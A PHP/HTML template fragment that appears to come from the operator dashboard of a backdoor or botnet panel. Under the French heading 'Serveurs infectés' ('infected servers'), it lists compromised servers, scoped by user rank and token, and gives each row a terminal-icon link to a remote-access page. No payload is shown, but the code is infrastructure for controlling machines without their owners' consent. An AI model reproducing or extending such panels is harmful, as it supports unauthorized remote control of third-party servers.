            ...
            <div class="col-md-12">
              <div class="card">
                <div class="card-header card-header-danger card-header-icon">
                  ...
                  <h4 class="card-title">Serveurs infectés</h4>
                </div>
                <div class="card-body">
                  <div class="toolbar">
                  </div>
                  <div class="material-datatables">
                    <table id="datatables" class="table table-striped table-no-bordered table-hover" cellspacing="0" width="100%" style="width:100%">
                      ...
                      <tbody>
                          <?php
                    if ($rowuser["rank"] == 1 or $rowuser["rank"] == 2){
                    if($_GET["mask"] === "false"){
                        $sql = "SELECT * FROM servers WHERE mask = 0 AND token = '".$rowuser["token"]."'";
                      }elseif($_GET["mask"] === "true"){
                        $sql = "SELECT * FROM servers WHERE mask = 1 AND token = '".$rowuser["token"]."'";
                      }
                      }elseif ($rowuser["rank"] == 3){
                    if($_GET["mask"] === "false"){
                        $sql = "SELECT * FROM servers WHERE mask = 0";
                      }elseif($_GET["mask"] === "true"){
                        $sql = "SELECT * FROM servers WHERE mask = 1";
                      }
                      }
                        ...
                        <tr>
                          ...
                          <td class="text-right">
                            <a href="server-access.php?serv=<? echo $row["id"]; ?>"><i class="fas fa-terminal"></i></a>
                          </td>
                        </tr>
                                      <?  } } }?>
                      </tbody>
